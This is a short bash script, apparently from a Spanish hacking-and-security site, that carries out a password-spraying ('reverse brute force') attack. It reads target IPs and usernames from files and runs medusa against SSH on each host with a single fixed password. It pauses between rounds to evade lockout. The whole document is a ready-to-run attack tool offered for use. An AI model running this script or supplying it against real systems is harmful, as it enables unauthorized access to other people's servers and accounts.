#!/bin/bash
echo
echo "##################################"
echo
echo " Ataque fuerza bruta inversa !!! "
echo " con medusa, con 5 minutos entre "
echo " cada reintento de autenticacion "
echo
echo " www.hackingyseguridad.com/ 2024 "
echo "#################################"
echo
for i in `cat ip.txt`;do echo
for u in `cat usuario0.txt`;do medusa -b -F -h $i -u $u -p Passwd00 -M ssh -n 22
done
        sleep 400
done
